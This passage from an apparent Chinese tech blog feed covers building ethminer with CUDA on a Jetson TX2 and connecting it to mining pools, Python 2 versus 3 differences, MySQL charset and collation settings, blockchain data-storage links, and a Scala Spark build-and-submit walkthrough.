&lt;div&gt;
    &lt;a href=&#34;#%e7%bc%96%e8%af%91ethminer&#34;&gt;
        #
    &lt;/a&gt;
    编译ethminer
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;开始前需要说一下，由于Jetson不支持OpenCL（Nvidia官方裁剪了系统 -__-凸），因此要在Jetson上使用ethminer的话就要直接使用CUDA，而且版本需要大于9.0，好在Jetpack v3.2使用了更高版本的CUDA。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Jetpack version: 3.2&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;从github下载ethminer&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/ethereum-mining/ethminer&#34;&gt;https://github.com/ethereum-mining/ethminer&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
$ git clone https://github.com/ethereum-mining/ethminer
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;编译ethminer&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;
$ git submodule update --init --recursive
$ mkdir build
$ cd build
$ cmake .. -DETHASHCUDA=ON -DETHASHCL=OFF    # 配置CUDA，默认使用OpenCL
$ sudo make install
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;开始挖矿&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%bc%80%e5%a7%8b%e6%8c%96%e7%9f%bf&#34;&gt;
        ##
    &lt;/a&gt;
    开始挖矿
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;挖矿前用先查看了下设备信息：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
$ ethminer -U --list-devices

Listing CUDA devices.
FORMAT: [deviceID] deviceName
[0] NVIDIA Tegra X2
        Compute version: 6.2
        cudaDeviceProp::totalGlobalMem: 8235802624
        Pci: 0000:00:00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;确定可以正常看到GPU信息后就开撸吧。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
# 使用f2pool进行挖矿的命令：

$ ethminer -U -S eth.f2pool.com:8080 -FS etc.f2pool.com:8118 -O 0x839c9c5d79a469ef58d13983f12b61266c373d70 -SP 1

# 使用ethfans进行挖矿的命令：

$ ethminer -U -S huabei-pool.ethfans.org:3333 -FS  huabei-pool.ethfans.org:13333 -O 0x839c9c5d79a469ef58d13983f12b61266c373d70 -SP 1 -SE singleye@163.com
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;参数解释：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;-U: 指定使用CUDA方法进行计算 （-G是使用OpenCL，Jetson不支持&amp;hellip;）&lt;/li&gt;
&lt;li&gt;-S: 指定矿池地址&lt;/li&gt;
&lt;li&gt;-FS: Failover矿池地址，当-S指定的矿池出现故障后会自动切换到这个地址&lt;/li&gt;
&lt;li&gt;-O: 指定自己的钱包地址，否则就白费功夫啦&lt;/li&gt;
&lt;li&gt;-SP: 指定stratum协议版本，需要跟矿池匹配，这里使用‘1’&lt;/li&gt;
&lt;li&gt;-SE: 可以制定一个自己的邮件地址，可能后面会发送统计信息到这里&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>python2 和 python3 的一些区别</title>
      <link>/2018/02/python2-%E5%92%8C-python3-%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8C%BA%E5%88%AB/</link>
      <pubDate>Mon, 26 Feb 2018 23:30:06 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2018/02/python2-%E5%92%8C-python3-%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8C%BA%E5%88%AB/</guid>
      <description>&lt;h1 id=&#34;python2与python3的区别&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#python2%e4%b8%8epython3%e7%9a%84%e5%8c%ba%e5%88%ab&#34;&gt;
        ##
    &lt;/a&gt;
    python2与python3的区别
&lt;/div&gt;
&lt;/h1&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;区别点&lt;/th&gt;
&lt;th&gt;python2&lt;/th&gt;
&lt;th&gt;python3&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;write()&lt;/td&gt;
&lt;td&gt;可以直接写utf8内容&lt;/td&gt;
&lt;td&gt;写utf8内容碰到：TypeError: write() argument must be str, not bytes&lt;/br&gt;解决方法：open(file, &amp;lsquo;wb&amp;rsquo;)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;super()&lt;/td&gt;
&lt;td&gt;super(CLASS_NAME, self).method()&lt;/td&gt;
&lt;td&gt;super().method()&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/&lt;/td&gt;
&lt;td&gt;除法运算，结果取整数&lt;/td&gt;
&lt;td&gt;除法运算，结果为浮点数，取证书使用“//”&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;dict&lt;/td&gt;
&lt;td&gt;has_key()可以用来查询是否存在某个键&lt;/td&gt;
&lt;td&gt;has_key()方法不存了，使用&amp;rsquo;key in dictionary&amp;rsquo;来查询(python2也支持该方法)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;python3的新特性&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#python3%e7%9a%84%e6%96%b0%e7%89%b9%e6%80%a7&#34;&gt;
        ##
    &lt;/a&gt;
    python3的新特性
&lt;/div&gt;
&lt;/h1&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;新特性&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;th&gt;参考&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;@&lt;/td&gt;
&lt;td&gt;矩阵乘法运算符，目前还没有定义built-in的矩阵数据类型&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://www.python.org/dev/peps/pep-0465&#34;&gt;PEP 465 - A dedicated infix operator for matrix multiplication&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/&lt;/td&gt;
&lt;td&gt;除法运算，结果浮点数&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;//&lt;/td&gt;
&lt;td&gt;除法运算，结果取整数&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
</description>
    </item>
    
    <item>
      <title>Mysql charset/collation字符编码设置</title>
      <link>/2018/01/mysql-charset/collation%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E8%AE%BE%E7%BD%AE/</link>
      <pubDate>Tue, 23 Jan 2018 11:20:33 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2018/01/mysql-charset/collation%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E8%AE%BE%E7%BD%AE/</guid>
      <description>&lt;p&gt;mysql在创建数据库时有两个跟字符编码相关的参数&amp;quot;character set&amp;quot;和&amp;quot;collate&amp;quot;，这里解释一下这两个参数的作用。&lt;/p&gt;
&lt;h2 id=&#34;character-set&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#character-set&#34;&gt;
        #
    &lt;/a&gt;
    character set
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;**“character set”**很容易解释，就是指定字符在存储到mysql中时使用的编码集。数据库支持哪些编码可以通过&amp;quot;show character set&amp;quot;获得。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
mysql&gt; show character set;
+----------+-----------------------------+---------------------+--------+
| Charset  | Description                 | Default collation   | Maxlen |
+----------+-----------------------------+---------------------+--------+
| big5     | Big5 Traditional Chinese    | big5_chinese_ci     |      2 |
| dec8     | DEC West European           | dec8_swedish_ci     |      1 |
| cp850    | DOS West European           | cp850_general_ci    |      1 |
| hp8      | HP West European            | hp8_english_ci      |      1 |
| koi8r    | KOI8-R Relcom Russian       | koi8r_general_ci    |      1 |
| latin1   | cp1252 West European        | latin1_swedish_ci   |      1 |
| latin2   | ISO 8859-2 Central European | latin2_general_ci   |      1 |
| swe7     | 7bit Swedish                | swe7_swedish_ci     |      1 |
| ascii    | US ASCII                    | ascii_general_ci    |      1 |
| ujis     | EUC-JP Japanese             | ujis_japanese_ci    |      3 |
| sjis     | Shift-JIS Japanese          | sjis_japanese_ci    |      2 |
| hebrew   | ISO 8859-8 Hebrew           | hebrew_general_ci   |      1 |
| tis620   | TIS620 Thai                 | tis620_thai_ci      |      1 |
| euckr    | EUC-KR Korean               | euckr_korean_ci     |      2 |
| koi8u    | KOI8-U Ukrainian            | koi8u_general_ci    |      1 |
| gb2312   | GB2312 Simplified Chinese   | gb2312_chinese_ci   |      2 |
| greek    | ISO 8859-7 Greek            | greek_general_ci    |      1 |
| cp1250   | Windows Central European    | cp1250_general_ci   |      1 |
| gbk      | GBK Simplified Chinese      | gbk_chinese_ci      |      2 |
| latin5   | ISO 8859-9 Turkish          | latin5_turkish_ci   |      1 |
| armscii8 | ARMSCII-8 Armenian          | armscii8_general_ci |      1 |
| utf8     | UTF-8 Unicode               | utf8_general_ci     |      3 |
| ucs2     | UCS-2 Unicode               | ucs2_general_ci     |      2 |
| cp866    | DOS Russian                 | cp866_general_ci    |      1 |
| keybcs2  | DOS Kamenicky Czech-Slovak  | keybcs2_general_ci  |      1 |
| macce    | Mac Central European        | macce_general_ci    |      1 |
| macroman | Mac West European           | macroman_general_ci |      1 |
| cp852    | DOS Central European        | cp852_general_ci    |      1 |
| latin7   | ISO 8859-13 Baltic          | latin7_general_ci   |      1 |
| utf8mb4  | UTF-8 Unicode               | utf8mb4_general_ci  |      4 |
| cp1251   | Windows Cyrillic            | cp1251_general_ci   |      1 |
| utf16    | UTF-16 Unicode              | utf16_general_ci    |      4 |
| utf16le  | UTF-16LE Unicode            | utf16le_general_ci  |      4 |
| cp1256   | Windows Arabic              | cp1256_general_ci   |      1 |
| cp1257   | Windows Baltic              | cp1257_general_ci   |      1 |
| utf32    | UTF-32 Unicode              | utf32_general_ci    |      4 |
| binary   | Binary pseudo charset       | binary              |      1 |
| geostd8  | GEOSTD8 Georgian            | geostd8_general_ci  |      1 |
| cp932    | SJIS for Windows Japanese   | cp932_japanese_ci   |      2 |
| eucjpms  | UJIS for Windows Japanese   | eucjpms_japanese_ci |      3 |
+----------+-----------------------------+---------------------+--------+
40 rows in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;collate&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#collate&#34;&gt;
        #
    &lt;/a&gt;
    collate
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;这个参数指定mysql根据哪些规则来比较存储的数据的字符集，这些信息可以用来进行数据的比较排序。&lt;/p&gt;
&lt;p&gt;这个参数的格式构成规则如下：&lt;/p&gt;
&lt;p&gt;&amp;ldquo;&amp;lt;字符集&amp;gt;_&amp;lt;语言相关信息&amp;gt;_&amp;lt;后缀&amp;gt;&amp;rdquo;&lt;/p&gt;
&lt;p&gt;例如： &amp;ldquo;utf8_general_ci&amp;rdquo;, &amp;ldquo;latin1_danish_ci&amp;rdquo;&lt;/p&gt;
&lt;h2 id=&#34;mysql一些其他特性&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#mysql%e4%b8%80%e4%ba%9b%e5%85%b6%e4%bb%96%e7%89%b9%e6%80%a7&#34;&gt;
        #
    &lt;/a&gt;
    mysql一些其他特性
&lt;/div&gt;
&lt;/h2&gt;
&lt;h3 id=&#34;1-mysql支持4个级别的字符集设置服务器数据库表列&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#1-mysql%e6%94%af%e6%8c%814%e4%b8%aa%e7%ba%a7%e5%88%ab%e7%9a%84%e5%ad%97%e7%ac%a6%e9%9b%86%e8%ae%be%e7%bd%ae%e6%9c%8d%e5%8a%a1%e5%99%a8%e6%95%b0%e6%8d%ae%e5%ba%93%e8%a1%a8%e5%88%97&#34;&gt;
        ##
    &lt;/a&gt;
    1. mysql支持4个级别的字符集设置：服务器，数据库，表，列。
&lt;/div&gt;
&lt;/h3&gt;
&lt;h4 id=&#34;11-服务器级别&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#11-%e6%9c%8d%e5%8a%a1%e5%99%a8%e7%ba%a7%e5%88%ab&#34;&gt;
        ###
    &lt;/a&gt;
    1.1 服务器级别
&lt;/div&gt;
&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;作用：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;服务器的字符集可以作为&amp;quot;CREATE DATABASE&amp;quot;的默认值&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;设置方法：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;启动参数： &amp;lsquo;&amp;ndash;character-set-server&amp;rsquo; &amp;lsquo;&amp;ndash;collation-server&amp;rsquo;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;查询：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;SHOW VARIABLES 查询 character_set_server/collation_server&lt;/p&gt;
&lt;h4 id=&#34;12-数据库级别&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#12-%e6%95%b0%e6%8d%ae%e5%ba%93%e7%ba%a7%e5%88%ab&#34;&gt;
        ###
    &lt;/a&gt;
    1.2 数据库级别
&lt;/div&gt;
&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;作用：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;作为创建表时的默认值&lt;/p&gt;
&lt;p&gt;影响LOAD_DATA语句中的CHARACTER SET的值&lt;/p&gt;
&lt;p&gt;影响存储过程中与字符编码相关的操作&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;设置方法：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;lsquo;CREATE DATABASE&amp;rsquo;或&amp;rsquo;ALTER DATABASE&amp;rsquo; 的参数 &amp;lsquo;CHARACTER SET&amp;rsquo; &amp;lsquo;COLLATE&amp;rsquo;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;查询：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;USE db_name;&lt;/br&gt;SELECT @@character_set_database, @@collation_database;&lt;/p&gt;
&lt;h4 id=&#34;13-表级别&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#13-%e8%a1%a8%e7%ba%a7%e5%88%ab&#34;&gt;
        ###
    &lt;/a&gt;
    1.3 表级别
&lt;/div&gt;
&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;作用：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;每张表可以有表级别的字符集。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;设置方法：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;使用 CREATE TABLE 和 ALTER TABLE 命令进行设置。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
CREATE TABLE tbl_name (column_list)
    [[DEFAULT] CHARACTER SET charset_name]
    [COLLATE collation_name]]

ALTER TABLE tbl_name
    [[DEFAULT] CHARACTER SET charset_name]
    [COLLATE collation_name]
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;查询：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;
SHOW CREATE TABLE table_name;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;14-列级别&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#14-%e5%88%97%e7%ba%a7%e5%88%ab&#34;&gt;
        ###
    &lt;/a&gt;
    1.4 列级别
&lt;/div&gt;
&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;作用：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;字符类型的列（CHAR, VARCHAR, TEXT）可以有一个本列相关的 character set和collation设置。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;设置方法：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;设置方法是在CREATE TABLE时使用相应的列参数。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
col_name {CHAR | VARCHAR | TEXT} (col_length)
    [CHARACTER SET charset_name]
    [COLLATE collation_name]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;比如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
CREATE TABLE t1
(
    col1 VARCHAR(5)
      CHARACTER SET utf8
      COLLATE utf8_general_ci
);

ALTER TABLE t1 MODIFY
    col1 VARCHAR(5)
      CHARACTER SET utf8
      COLLATE utf8_general_ci;
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;查询：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;
SHOW CREATE TABLE table_name;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;clientserver通讯字符编码&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#clientserver%e9%80%9a%e8%ae%af%e5%ad%97%e7%ac%a6%e7%bc%96%e7%a0%81&#34;&gt;
        ##
    &lt;/a&gt;
    client/server通讯字符编码
&lt;/div&gt;
&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;设置：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;mysql数据库client/server之间通讯的字符编码也可以单独设置，设置的方法有若干种：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用SQL命令&amp;quot;SET NAME &amp;lsquo;charset_name&amp;quot;和 &amp;ldquo;SET CHAARACTER SET &amp;lsquo;charset_name&amp;rsquo;&amp;ldquo;设置：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
SET NAME &#39;utf8&#39;;


SET character_set_client = charset_name;
SET character_set_results = charset_name;
SET collation_connection = @@collation_database;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;使用mysql配置文件设置：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;[mysql]
default-character-set=koi8r&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用mysql客户端设置：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
mysql&gt; charset utf8
Charset changed
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;查询：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;
SHOW VARIABLES LIKE &#39;character_set%&#39;;
SHOW VARIABLES LIKE &#39;collation%&#39;;
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;参考&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%8f%82%e8%80%83&#34;&gt;
        ##
    &lt;/a&gt;
    参考
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;*&lt;a href=&#34;https://dev.mysql.com/doc/refman/5.7/en/charset.html&#34;&gt;https://dev.mysql.com/doc/refman/5.7/en/charset.html&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>在区块链上存储信息</title>
      <link>/2018/01/%E5%9C%A8%E5%8C%BA%E5%9D%97%E9%93%BE%E4%B8%8A%E5%AD%98%E5%82%A8%E4%BF%A1%E6%81%AF/</link>
      <pubDate>Sat, 13 Jan 2018 09:30:01 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2018/01/%E5%9C%A8%E5%8C%BA%E5%9D%97%E9%93%BE%E4%B8%8A%E5%AD%98%E5%82%A8%E4%BF%A1%E6%81%AF/</guid>
      <description>&lt;p&gt;区块链本质上讲是一个分布式存储，目前流行的比特币/以太坊主要用来存储交易数据，那么是否可以利用这些公链存储别的信息呢？&lt;/p&gt;
&lt;p&gt;当然是有的，收集了几篇关于如何使用区块链存储数据文章，回头有空了再来整理一下。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://www.righto.com/2014/02/ascii-bernanke-wikileaks-photographs.html&#34;&gt;http://www.righto.com/2014/02/ascii-bernanke-wikileaks-photographs.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://bitcoin.stackexchange.com/questions/39347/how-to-store-data-on-the-blockchain&#34;&gt;https://bitcoin.stackexchange.com/questions/39347/how-to-store-data-on-the-blockchain&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://ethereum.stackexchange.com/questions/7884/how-can-i-store-data-in-ethereum-blockchain&#34;&gt;https://ethereum.stackexchange.com/questions/7884/how-can-i-store-data-in-ethereum-blockchain&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://docs.google.com/document/d/1UwaaUgunnrFpL6jetA_DdNLQsbbqBx1HLcln07kLrUw/edit&#34;&gt;https://docs.google.com/document/d/1UwaaUgunnrFpL6jetA_DdNLQsbbqBx1HLcln07kLrUw/edit&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Spark开发</title>
      <link>/2018/01/spark%E5%BC%80%E5%8F%91/</link>
      <pubDate>Thu, 11 Jan 2018 23:10:50 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2018/01/spark%E5%BC%80%E5%8F%91/</guid>
      <description>&lt;h2 id=&#34;使用scala进行开发&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e4%bd%bf%e7%94%a8scala%e8%bf%9b%e8%a1%8c%e5%bc%80%e5%8f%91&#34;&gt;
        #
    &lt;/a&gt;
    使用scala进行开发
&lt;/div&gt;
&lt;/h2&gt;
&lt;h3 id=&#34;step1-安装sbt&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#step1-%e5%ae%89%e8%a3%85sbt&#34;&gt;
        ##
    &lt;/a&gt;
    Step1: 安装sbt
&lt;/div&gt;
&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;
$ curl https://bintray.com/sbt/rpm/rpm | sudo tee /etc/yum.repos.d/bintray-sbt-rpm.repo
$ sudo yum install sbt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;配置源：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
# cat ~/.sbt/repositories
[repositories]
  # 本地源
  local
  # 阿里源
  aliyun: http://maven.aliyun.com/nexus/content/groups/public/
  typesafe: http://repo.typesafe.com/typesafe/ivy-releases/, [organization]/[module]/(scala_[scalaVersion]/)(sbt_[sbtVersion]/)[revision]/[type]s/[artifact](-[classifier]).[ext], bootOnly
  sonatype-oss-releases
  maven-central
  sonatype-oss-snapshots
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;step2-创建项目&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#step2-%e5%88%9b%e5%bb%ba%e9%a1%b9%e7%9b%ae&#34;&gt;
        ##
    &lt;/a&gt;
    Step2: 创建项目
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;可以使用Giter8模版创建项目。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
$ sbt new imarios/frameless.g8
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;spark相关的几个模版：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;holdenk/sparkProjectTemplate.g8 (Template for Scala Apache Spark project).&lt;/li&gt;
&lt;li&gt;imarios/frameless.g8 (A simple frameless template to start with more expressive types for Spark)&lt;/li&gt;
&lt;li&gt;nttdata-oss/basic-spark-project.g8 (Spark basic project.)&lt;/li&gt;
&lt;li&gt;spark-jobserver/spark-jobserver.g8 (Template for Spark Jobserver)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;step3-编写代码&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#step3-%e7%bc%96%e5%86%99%e4%bb%a3%e7%a0%81&#34;&gt;
        ##
    &lt;/a&gt;
    Step3: 编写代码
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;创建出的项目目录中包含一下主要条目：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
$ ls
build.sbt  project  src  target
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;编写的代码放在 &amp;lsquo;src/main/scala/&amp;rsquo; 目录中：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
$ ls src/main/scala/
SimpleApp.scala

$ cat src/main/scala/SimpleApp.scala
import org.apache.spark.sql.SparkSession

object SimpleApp {
  def main(args: Array[String]) {
    val logFile = &#34;people.txt&#34; // Should be some file on your system
    val spark = SparkSession.builder.appName(&#34;Simple Application&#34;).getOrCreate()
    val logData = spark.read.textFile(logFile).cache()
    val numAs = logData.filter(line =&gt; line.contains(&#34;a&#34;)).count()
    val numBs = logData.filter(line =&gt; line.contains(&#34;b&#34;)).count()
    println(s&#34;Lines with a: $numAs, Lines with b: $numBs&#34;)
    spark.stop()
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;step4-编译打包&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#step4-%e7%bc%96%e8%af%91%e6%89%93%e5%8c%85&#34;&gt;
        ##
    &lt;/a&gt;
    Step4: 编译打包
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;程序开发好之后首先需要编译打包：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
$ sbt package
[info] Loading project definition from /home/spark/scala/frameless/project
[info] Updating {file:/home/spark/scala/frameless/project/}frameless-build...
[info] Resolving org.fusesource.jansi#jansi;1.4 ...
[info] Done updating.
[info] Set current project to frameless (in build file:/home/spark/scala/frameless/)
[info] Updating {file:/home/spark/scala/frameless/}root...
[info] Resolving org.sonatype.oss#oss-parent;9 ...
[info] downloading https://repo1.maven.org/maven2/org/scala-lang/scala-library/2.11.11/scala-library-2.11.11.jar ...
[info]  [SUCCESSFUL ] org.scala-lang#scala-library;2.11.11!scala-library.jar (94788ms)

...

[info] downloading https://repo1.maven.org/maven2/jline/jline/2.14.3/jline-2.14.3.jar ...
[info]  [SUCCESSFUL ] jline#jline;2.14.3!jline.jar (4836ms)
[info] Done updating.
[info] Compiling 1 Scala source to /home/spark/scala/frameless/target/scala-2.11/classes...
[info] &#39;compiler-interface&#39; not yet compiled for Scala 2.11.11. Compiling...
[info]   Compilation completed in 24.981 s
[info] Packaging /home/spark/scala/frameless/target/scala-2.11/frameless_2.11-0.1.jar ...
[info] Done packaging.
[success] Total time: 2795 s, completed Jan 16, 2018 3:03:12 PM
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;编译打包成功后的文件输出在 &amp;rsquo;target/scala-2.11/&amp;rsquo; 目录中：&lt;/p&gt;
&lt;p&gt;/home/spark/scala/frameless/target/scala-2.11/frameless_2.11-0.1.jar&lt;/p&gt;
&lt;h3 id=&#34;step5-部署运行&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#step5-%e9%83%a8%e7%bd%b2%e8%bf%90%e8%a1%8c&#34;&gt;
        ##
    &lt;/a&gt;
    Step5: 部署运行
&lt;/div&gt;
&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;
# su - spark
$ export SPARK_MAJOR_VERSION=2

$ spark-submit --class SimpleApp --master yarn-client --num-executors 1 --driver-memory 512m --executor-memory 512m --executor-cores 1 target/scala-2.11/frameless_2.11-0.1.jar
SPARK_MAJOR_VERSION is set to 2, using Spark2
Warning: Master yarn-client is deprecated since 2.0. Please use master &#34;yarn&#34; with specified deploy mode instead.
18/01/17 15:20:18 INFO SparkContext: Running Spark version 2.2.0.2.6.3.0-235
18/01/17 15:20:19 INFO SparkContext: Submitted application: Simple Application
18/01/17 15:20:19 INFO SecurityManager: Changing view acls to: spark
18/01/17 15:20:19 INFO SecurityManager: Changing modify acls to: spark
18/01/17 15:20:19 INFO SecurityManager: Changing view acls groups to:
18/01/17 15:20:19 INFO SecurityManager: Changing modify acls groups to:
18/01/17 15:20:19 INFO SecurityManager: SecurityManager: authentication disabled; ui acls disabled; users  with view permissions: Set(spark); groups with view
 permissions: Set(); users  with modify permissions: Set(spark); groups with modify permissions: Set()
18/01/17 15:20:20 INFO Utils: Successfully started service &#39;sparkDriver&#39; on port 43573.

...

18/01/17 15:21:30 INFO YarnScheduler: Adding task set 3.0 with 1 tasks
18/01/17 15:21:30 INFO TaskSetManager: Starting task 0.0 in stage 3.0 (TID 3, bdtest-002, executor 1, partition 0, NODE_LOCAL, 4737 bytes)
18/01/17 15:21:30 INFO BlockManagerInfo: Added broadcast_4_piece0 in memory on bdtest-002:44065 (size: 3.7 KB, free: 93.2 MB)
18/01/17 15:21:30 INFO MapOutputTrackerMasterEndpoint: Asked to send map output locations for shuffle 1 to 192.168.1.4:44312
18/01/17 15:21:30 INFO MapOutputTrackerMaster: Size of output statuses for shuffle 1 is 141 bytes
18/01/17 15:21:30 INFO TaskSetManager: Finished task 0.0 in stage 3.0 (TID 3) in 96 ms on bdtest-002 (executor 1) (1/1)
18/01/17 15:21:30 INFO YarnScheduler: Removed TaskSet 3.0, whose tasks have all completed, from pool
18/01/17 15:21:30 INFO DAGScheduler: ResultStage 3 (count at SimpleApp.scala:10) finished in 0.096 s
18/01/17 15:21:30 INFO DAGScheduler: Job 1 finished: count at SimpleApp.scala:10, took 0.289165 s
Lines with a: 1, Lines with b: 0
